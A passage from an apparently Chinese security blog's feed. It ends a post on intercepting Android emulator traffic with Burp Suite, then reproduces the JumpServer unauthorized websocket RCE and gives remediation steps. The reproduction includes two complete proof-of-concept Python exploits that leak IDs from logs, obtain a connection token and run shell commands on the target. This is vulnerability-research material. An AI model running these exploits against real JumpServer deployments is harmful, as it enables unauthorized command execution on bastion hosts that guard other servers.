href="https://www.cnblogs.com/iamstudy/articles/android_begin_start.html">https://www.cnblogs.com/iamstudy/articles/android_begin_start.html</a> (L3m0n师傅的，不过偏向逆向工程的一些东西，跟着来一遍吧，总会遇到的)</p></li><li><p><a href="https://www.cnblogs.com/wjrblogs/p/13683812.html">https://www.cnblogs.com/wjrblogs/p/13683812.html</a></p></li></ul><h1 id="相关技术要点"><a href="#相关技术要点" class="headerlink" title="相关技术要点"></a>相关技术要点</h1><p>参考资料3.</p><p>1、远古时期，无ssl证书，明文传输数据。<br>2、采用ssl证书加密，但未使用做ssl Pining技术<br>3、采用ssl证书加密，但使用了ssl pining技术。<br>4、双向加密</p><h1 id="MacOS下的模拟器"><a href="#MacOS下的模拟器" class="headerlink" title="MacOS下的模拟器"></a>MacOS下的模拟器</h1><ul><li>蓝叠。之前下载过，但是打不开。</li><li>网易MuMu</li></ul><h1 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew  install cask android-platform-tools</span><br></pre></td></tr></table></figure><p>db连接，<strong>mac下网易mumu端口是5555</strong>，windows下是7555</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows下:</span><br><span class="line">adb connect 127.0.0.1:7555</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">mac下:</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure><h1 id="jeb"><a href="#jeb" class="headerlink" title="jeb"></a>jeb</h1><p>配合 adb 来动态调试的。</p><p>首先通过字符串搜索，定位到某个位置，command + b下断点。<br>在mumu上运行apk，然后attach</p><h1 id="模拟器-端口"><a href="#模拟器-端口" class="headerlink" title="模拟器/端口"></a>模拟器/端口</h1><p>下面貌似都是Windows下的，没实验过。</p><ul><li>夜神安卓模拟器 62001  </li><li>逍遥安卓模拟器 21503  </li><li>BlueStacks(蓝叠安卓模拟器) 5555  </li><li>雷电安卓模拟器 5555  </li><li>天天安卓模拟器 6555  </li><li>网易MuMu(安卓模拟器) 7555  </li><li>安卓模拟器大师 54001</li></ul><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-查看本机IP"><a href="#1-查看本机IP" class="headerlink" title="1. 查看本机IP"></a>1. 查看本机IP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> ✘ m0nk3y@🍎  ~&#x2F;tools&#x2F;Android  ifconfig en0</span><br><span class="line">en0: flags&#x3D;8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options&#x3D;400&lt;CHANNEL_IO&gt;</span><br><span class="line">ether 3c:22:fb:e1:41:53</span><br><span class="line">inet 192.168.1.6 netmask 0xffffff00 broadcast 192.168.1.255</span><br><span class="line">nd6 options&#x3D;201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br></pre></td></tr></table></figure><p>我这里为 192.168.1.6</p><h2 id="2-设置Burpsuite的代理"><a href="#2-设置Burpsuite的代理" class="headerlink" title="2. 设置Burpsuite的代理"></a>2. 设置Burpsuite的代理</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012306.png"></p><h2 id="3-设置MuMu模拟器中的WiFi代理"><a href="#3-设置MuMu模拟器中的WiFi代理" class="headerlink" title="3. 设置MuMu模拟器中的WiFi代理"></a>3. 设置MuMu模拟器中的WiFi代理</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012307.png"></p><h2 id="4-安装BurpSuite证书"><a href="#4-安装BurpSuite证书" class="headerlink" title="4. 安装BurpSuite证书"></a>4. 安装BurpSuite证书</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012308.png"></p><p>安卓系统无法安装 <code>.der</code> 后缀的证书，所以需要用文件管理器更改下载的证书后缀为 <code>.cer</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012309.png"></p><p>安装过程中，设置解锁pin码，我设置为了6666。</p><h2 id="5-用BurpSuite抓包测试"><a href="#5-用BurpSuite抓包测试" class="headerlink" title="5. 用BurpSuite抓包测试"></a>5. 用BurpSuite抓包测试</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012310.png"></p><p>可以看到http/https的包都能抓到了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;常规渗透测试时，肯定不可能少对移动端APP、微信小程序等进行测试。这一块，还停留在最基础的水平。&lt;/p&gt;</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现：JumpServer WebSocksts Unauthorized RCE</title>
    <link href="https://hack-for.fun/97f2.html"/>
    <id>https://hack-for.fun/97f2.html</id>
    <published>2021-01-18T13:35:34.000Z</published>
    <updated>2021-01-21T08:15:32.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p><strong>JumpServer</strong> 是全球首款完全开源的堡垒机, 使用 GNU GPL v2.0 开源协议, 是符合 4A 的专业运维审计系统。 使用 Python / Django 进行开发, 遵循 Web 2.0 规范, 配备了业界领先的 Web Terminal 解决方案, 交互界面美观、用户体验好。 采纳分布式架构, 支持多机房跨区域部署, 中心节点提供 API, 各机房部署登录节点, 可横向扩展、无并发访问限制。</p><p>由于<strong>JumpServer</strong>程序中连接websocket的接口未做授权限制，导致攻击者可<strong>构造恶意请求获取服务器敏感信息，通过敏感信息中的相关参数，可构造请求获取相应token</strong>，进而可通过相关API操作来执行任意命令。</p><h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>参考这位师傅的文章：<a href="https://www.o2oxy.cn/2921.html">https://www.o2oxy.cn/2921.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User    Check   ........................ [ OK ]</span><br><span class="line">OS      Check   ........................ [ ERROR ] 操作系统类型版本不符合要求，请使用 CentOS 7</span><br><span class="line">CPU     Check   ........................ [ ERROR ] CPU 小于 2核，JumpServer 所在机器的 CPU 需要至少 2核</span><br><span class="line">Memory  Check   ........................ [ ERROR ] 内存小于 8G，JumpServer 所在机器的内存需要至少 8G</span><br></pre></td></tr></table></figure><p>2核8G。。之前傻逼了，以为CentOS安装好后，重启成为命令行模式，以为是错的，结果这是以为没有安装gui。</p><p><a href="https://zhuanlan.zhihu.com/p/126601630">https://zhuanlan.zhihu.com/p/126601630</a></p><p>CentOS 7 ：<a href="https://mirrors.ustc.edu.cn/centos/7.9.2009/isos/x86_64/">https://mirrors.ustc.edu.cn/centos/7.9.2009/isos/x86_64/</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="公开POC-1"><a href="#公开POC-1" class="headerlink" title="公开POC 1"></a>公开POC 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment"># import json</span></span><br><span class="line"><span class="comment"># data=&#123;&quot;user&quot;:&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;,&quot;asset&quot;:&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;:&quot;79655e4e-1741-46af-a793-fff394540a52&quot;&#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># url_host=&#x27;http://192.168.1.73:8080&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># def get_token():</span></span><br><span class="line"><span class="comment">#     url = url_host+&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line"><span class="comment">#     url =url_host+&#x27;/api/v1/authentication/connection-token/?user-only=1&#x27;</span></span><br><span class="line"><span class="comment">#     response = requests.post(url, json=data).json()</span></span><br><span class="line"><span class="comment">#     print(response)</span></span><br><span class="line"><span class="comment">#     ret=requests.get(url_host+&#x27;/api/v1/authentication/connection-token/?token=%s&#x27;%response[&#x27;token&#x27;])</span></span><br><span class="line"><span class="comment">#     print(ret.text)</span></span><br><span class="line"><span class="comment"># get_token()</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=None&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务器端发送认证后的消息</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket,_text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line">    recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">    print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> websocket:</span><br><span class="line">        recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        resws=json.loads(recv_text)</span><br><span class="line">        id = resws[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span>+id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket,inittext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;exec cmd: ls&quot;</span>)</span><br><span class="line">        cmdtext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd+<span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line">        print(cmdtext)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket, cmdtext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;#######finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> sys</span><br><span class="line">        host=sys.argv[<span class="number">1</span>]</span><br><span class="line">        cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> host[<span class="number">-1</span>]==<span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            host=host[:<span class="number">-1</span>]</span><br><span class="line">        print(host)</span><br><span class="line">        data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;</span>,</span><br><span class="line">                <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;79655e4e-1741-46af-a793-fff394540a52&quot;</span>&#125;</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        res = requests.post(host + url, json=data)</span><br><span class="line">        token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line">        print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">        target = <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">        print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">        asyncio.get_event_loop().run_until_complete(main_logic(cmd))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;python jumpserver.py http://192.168.1.73 whoami&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="公开POC-2"><a href="#公开POC-2" class="headerlink" title="公开POC 2"></a>公开POC 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&#x27;http://127.0.0.1&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;ifconfig&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">    url = target_url.replace(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ws&quot;</span>) + <span class="string">&quot;/ws/ops/tasks/log/&quot;</span></span><br><span class="line">    print(<span class="string">&quot;Request =&gt; &quot;</span> + url + <span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(url, timeout=<span class="number">3</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&#x27;&#123;&quot;task&quot;:&quot;/opt/jumpserver/logs/gunicorn&quot;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rs = <span class="keyword">await</span> asyncio.wait_for(websocket.recv(), timeout=<span class="number">3</span>)</span><br><span class="line">                print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;/api/v1/perms/asset-permissions/user/validate&#x27;</span> <span class="keyword">in</span> rs:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&quot;Vulnerability may not exist&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;Vulnerability may exist&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern = re.compile(<span class="string">r&#x27;asset_id=(.*?)&amp;cache_policy=1&amp;system_user_id=(.*?)&amp;user_id=(.*?) &#x27;</span>)</span><br><span class="line">        matchObj = pattern.search(rs)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> matchObj:</span><br><span class="line">            asset_id = matchObj.group(<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">&#x27;asset_id = &#x27;</span> + asset_id)</span><br><span class="line">            system_user_id = matchObj.group(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">&#x27;system_user_id = &#x27;</span> + system_user_id)</span><br><span class="line">            user_id = matchObj.group(<span class="number">3</span>)</span><br><span class="line">            print(<span class="string">&#x27;user_id = &#x27;</span> + user_id)</span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;<span class="string">&#x27;asset&#x27;</span>: asset_id, <span class="string">&#x27;system_user&#x27;</span>: system_user_id, <span class="string">&#x27;user&#x27;</span>: user_id&#125;</span><br><span class="line">    url = target_url + <span class="string">&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line">    print(<span class="string">&quot;Request =&gt; &quot;</span> + url + <span class="string">&#x27; get token&#x27;</span>)</span><br><span class="line">    response = requests.post(url, json=data).json()</span><br><span class="line">    print(<span class="string">&#x27;token = &#x27;</span> + response[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">    print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(url, timeout=<span class="number">3</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + url)</span><br><span class="line">        rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">        id = json.loads(rs)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;id = &quot;</span> + id)</span><br><span class="line">        print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        init_payload = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + <span class="string">&quot;TERMINAL_INIT&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(init_payload)</span><br><span class="line">        rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line"></span><br><span class="line">        rs = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">&quot;Last login&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rs:</span><br><span class="line">            rs = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line"></span><br><span class="line">        cmd_payload = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd + <span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line">        print(<span class="string">&quot;Request =&gt; &quot;</span> + <span class="string">&quot;Cmd Payload&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(cmd_payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rs = <span class="keyword">await</span> asyncio.wait_for(websocket.recv(), timeout=<span class="number">3</span>)</span><br><span class="line">                print(<span class="string">&quot;Recv =&gt; &quot;</span> + rs)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&#x27;========================================================================================================================================================&#x27;</span>)</span><br><span class="line">                print(<span class="string">&#x27;recv data end&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    token = asyncio.get_event_loop().run_until_complete(get_token())</span><br><span class="line">    url = target_url.replace(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ws&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(attack(url))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>参考 <a href="https://github.com/jumpserver/jumpserver">https://github.com/jumpserver/jumpserver</a></p><h2 id="紧急BUG修复通知"><a href="#紧急BUG修复通知" class="headerlink" title="紧急BUG修复通知"></a>紧急BUG修复通知</h2><p>JumpServer发现远程执行漏洞，请速度修复</p><p>非常感谢 <strong>reactivity of Alibaba Hackerone bug bounty program</strong>(瑞典) 向我们报告了此 BUG</p><p><strong>影响版本:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; v2.6.2</span><br><span class="line">&lt; v2.5.4</span><br><span class="line">&lt; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9</span><br><span class="line">&gt;&#x3D; v1.5.3</span><br></pre></td></tr></table></figure><p><strong>安全版本:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&#x3D; v2.6.2</span><br><span class="line">&gt;&#x3D; v2.5.4</span><br><span class="line">&gt;&#x3D; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9 （版本号没变）</span><br><span class="line">&lt; v1.5.3</span><br></pre></td></tr></table></figure><p><strong>修复方案:</strong></p><p>将JumpServer升级至安全版本；</p><p><strong>临时修复方案:</strong></p><p>修改 Nginx 配置文件屏蔽漏洞接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;</span><br><span class="line">&#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;</span><br></pre></td></tr></table></figure><p>Nginx 配置文件位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 社区老版本</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;jumpserver.conf</span><br><span class="line"></span><br><span class="line"># 企业老版本</span><br><span class="line">jumpserver-release&#x2F;nginx&#x2F;http_server.conf</span><br><span class="line"> </span><br><span class="line"># 新版本在 </span><br><span class="line">jumpserver-release&#x2F;compose&#x2F;config_static&#x2F;http_server.conf</span><br></pre></td></tr></table></figure><p>修改 Nginx 配置文件实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">### 保证在 &#x2F;api 之前 和 &#x2F; 之前</span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F; 